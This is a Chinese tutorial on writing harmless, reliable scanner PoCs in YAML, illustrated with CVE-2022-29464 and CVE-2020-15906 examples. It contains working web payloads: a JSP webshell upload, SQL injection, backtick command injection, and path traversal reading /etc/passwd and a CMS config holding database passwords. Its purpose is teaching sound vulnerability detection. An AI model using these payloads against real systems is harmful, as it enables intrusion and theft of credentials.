# 如何编写一个高质量POC
### 相关视频教程
[高质量POC编写规范与模版](https://www.bilibili.com/video/BV1wt4y1w7Qi)
### 简述
我们在考量一个POC是否优质，是否高质量，主要是参考以下的内容：

1. payload是否无害
2. payload是否合理
   1. 是否随机化
   2. 是否已经是最精简的探测
3. payload是否通用
4. 对返回包的判断是否严谨
5. 整体的请求是否符合逻辑

而这些内容其主要影响的就是扫描的效果，其影响效果可以简单的看作：**漏报、误报、危害**
因为我们的POC在加载到扫描器后，会遇到非常多的目标，所以如果不编写一个高质量的POC，就很容易出现上述的情况。
我们首要关注的便是**危害性**，然后借用[《漏洞检测的那些事儿》](https://paper.seebug.org/9/)中提到的三个编写标准“**随机性、确定性、通用性**”，便构成了高质量POC。
### 危害性
对于一个POC，我们首先要看的就是有没有危害。

- 文件上传时，上传了shell并没有删除
- 文件上传覆盖了源文件
- 测试了任意文件删除漏洞
- 修改了用户密码
- 对数据库进行了数据的操作：添加，修改，删除
- ...

如以下漏洞：
**CVE-2020-15906：**

- Tiki Wiki在21.2 版本之前的 tiki-login.php 在 50 次无效登录尝试后将管理员密码设置为空白值。
- 对于这个漏洞，我们便不能直接通过发送50次登陆的操作来让测试目标的管理员密码置空，我们可以通过查看漏洞的影响范围，然后通过确认测试目标的版本来判断是否有漏洞存在

**CVE-2022-29464:**

- 某些 WSO2 产品允许无限制地上传文件，从而执行远程代码。
- 对于这个漏洞，在进行文件上传的测试时，首先便要确定不能上传一句话木马等内容。
```yaml
name: poc-yaml-test
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /fileupload
            headers:
                Content-Type: multipart/form-data; boundary=---------------------------250033711231076532771336998311
            body: "\
                -----------------------------250033711231076532771336998311\r\n\
                Content-Disposition: form-data; name=\"wenshell.jsp\";filename=\"webshell.jsp\"\r\n\
                \r\n\
                <% if(request.getParameter("f")!=null)(new java.io.FileOutputStream(applicaxxx; %>\r\n\
                -----------------------------250033711231076532771336998311--
                "
        expression: response.status == 200
    r1:
        request:
            cache: true
            method: GET
            path: /wenshell.jsp?f=1.txt&t=hello123123
        expression: response.status == 200 && response.body_string.contains("hello123123")
expression: r0() && r1()
detail:
    author: test
    links:
        - https://nvd.nist.gov/vuln/detail/CVE-2022-29464
```
通过上面这个POC我们可以看出来，主要有几个问题：

1. 上传了一个webshell并且没有进行删除
2. 文件上传名称没有随机化
3. 执行的命令是一个随机字符串
4. boundary未随机化

 所以我们根据上述的问题，对该POC进行修改：
```yaml
name: poc-yaml-test
manual: true
transport: http
set:
    filename: randomLowercase(7)
    rboundary: randomLowercase(8)
    s1: randomInt(100000, 200000)
    s2: randomInt(10000, 20000)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /fileupload
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
            body: "\
                ------WebKitFormBoundary{{rboundary}}\r\n\
                Content-Disposition: form-data; name=\"{{filename}}.jsp\";filename=\"{{filename}}.jsp\"\r\n\
                \r\n\
                <%out.print({{s1}} - {{s2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n\
                ------WebKitFormBoundary{{rboundary}}--
                "
        expression: response.status == 200
    r1:
        request:
            cache: true
            method: GET
            path: /{{filename}}.jsp
        expression: response.status == 200 && response.body_string.contains(string(s1 - s2))
expression: r0() && r1()
detail:
    author: test
    links:
        - https://nvd.nist.gov/vuln/detail/CVE-2022-29464
```
这样修改后，便变成了一个无害化的POC
### 随机性
PoC 中所涉及的关键变量或数据应该具有随机性，切勿使用固定的变量值生成 Payload，能够随机生成的尽量随机生成（如：上传文件的文件名，Alert 的字符串，MD5 值）
**文件上传：**
例如上面的例子，其中的文件名称便没有随机化，且不说webshell的问题，如果是一个正常的文件上传，在文件名称固定的情况下，就有可能出现几种情况：

1. 文件名重复，上传失败，无法检测出漏洞，造成漏报
2. 文件名重复，上传成功，被重命名，无法获取到上传后的文件名称地址，无法检测出漏洞，造成漏报
3. 文件名重复，上传成功，覆盖测试目标的文件内容，造成危害

**sql注入：**
```yaml
name: poc-yaml-test-sqli
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /index.jsp?id=1%27%20union%20select%20md5(1)
            follow_redirects: true
        expression: response.body_string.contains("c4ca4238a0b923820dcc509a6f75849b")
expression: r0()
detail:
    author: test
    links:
        - https://www.test.com
```
在这个例子中，使用了md5(1)来作为sql命令执行的验证，而这样便会出现如下问题：

- 测试目标并没有漏洞，但页面中存在1的md5值，造成误报

**RCE：**
```yaml
name: poc-yaml-test-rce
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /test
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                id=`id`
        expression: response.status == 200 && response.body_string.contains("uid")
expression: r0() 
detail:
    author: test
    links:
        - http://test.com
```
这样的命令执行存在两个问题：

1. 使用id做命令执行检测，没有考虑到windows的情况
2. id返回的内容太过随机，且匹配的内容过于常见，容易产生误报

可以这样修改：
```yaml
name: poc-yaml-test-rce
manual: true
transport: http
set:
    s1: randomInt(100000, 200000)
    s2: randomInt(10000, 20000)
rules:
    # windows的情况
    r0:
        request:
            cache: true
            method: POST
            path: /test
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                id=set /A {{s1}}-{{s2}}
        expression: response.status == 200 && response.body_string.contains(string(s1 - s2))
    # linux的情况
    r1:
        request:
            cache: true
            method: POST
            path: /test
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                id=expr {{s1}} - {{s2}}
        expression: response.status == 200 && response.body_string.contains(string(s1 - s2))
expression: r0() || r1()
detail:
    author: test
    links:
        - http://test.com
```
### 确定性
PoC 中能通过测试返回的内容找到唯一确定的标识来说明该漏洞是否存在，并且这个标识需要有针对性，切勿使用过于模糊的条件去判断

1. 尽量不要仅使用单一条件来判断，比如只判断 response.status 或者 response.content_type会造成误报
2. 不要使用容易变化的值来判断，比如 content length， 会造成漏报
3. 不要使用容易出现的值来判断, 比如
   1. response.body_string.contains("upload success") 会造成误报
   2. 计算了一个空页面/空图片的md5值用于判断
4. 不要使用很常见的值来判断漏洞命中，比如“admin”、“root”

例如该文件内容：
```php
<?php
$ROOT_PATH=getenv("DOCUMENT_ROOT");

if($ROOT_PATH=="")
   $ROOT_PATH="d:/myoa/webroot/";

//$ROOT_PATH="d:/myoa/webroot/";

if(substr($ROOT_PATH,-1)!="/")
   $ROOT_PATH.="/";

//(Windows) --
$ATTACH_PATH=$ROOT_PATH."attachment/";
$ATTACH_PATH2=realpath($ROOT_PATH."../")."/attach/";

//(Unix/Linux) --
//$ATTACH_PATH="/myoa/attachment/";
//$ATTACH_PATH2="/myoa/attach/";

$BACKUP_PATH=realpath($ROOT_PATH."../")."/bak/";

$SMS_REF_SEC=30;
```
对于上述的文件内容，有以下POC进行匹配：
```yaml
name: poc-yaml-test
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /index.php?f=config.php
            follow_redirects: true
        expression: response.body_string.contains("webroot")
expression: r0()
detail:
    author: test
    links:
        - https://www.test.com
```
显然，上面的规则非常的弱，因为会有很多的网页中存在webroot这样的关键词，同时index.php也非常的常见，所以会出现大量的误报。
所以我们需要这样修改：
```yaml
name: poc-yaml-test
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /index.php?f=config.php
            follow_redirects: true
        expression: response.status == 200 && response.body.bstartsWith(bytes("<?php")) && response.body_string.contains("$ROOT_PATH=getenv") 
expression: r0()
detail:
    author: test
    links:
        - https://www.test.com
```
### 通用性
PoC 中所使用的 Payload 或包含的检测代码应兼顾各个环境或平台
测试命令执行、文件读取类漏洞，请考虑Linux和Windows下的情况，POC里不要执行类似id、uname、/etc/passwd等操作，否则可能不兼容Windows环境。同时id等命令返回的信息也比较弱。
例如：
```yaml
name: poc-yaml-xxxcms-lfi
manual: true
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /index.php?id=../../../../../etc/passwd
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
expression: r0()
detail:
  author: test
  links:
    - https://www.test.com
```
上述的内容便没有考虑到其他平台的情况，所以有两种修改方式，第一是再添加一条规则来适配windows，第二是读cms中自带的文件，这样写的简单，且不容易出现问题
```yaml
name: poc-yaml-xxxcms-lfi
manual: true
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /index.php?id=../../Conf/config.php
    expression: response.status == 200 && response.body_string.contains("<?php") && response.body_string.contains("db_name") && response.body_string.contains("db_pwd") && response.body_string.contains("db_host")
expression: r0()
detail:
  author: test
  links:
    - https://www.test.com

```
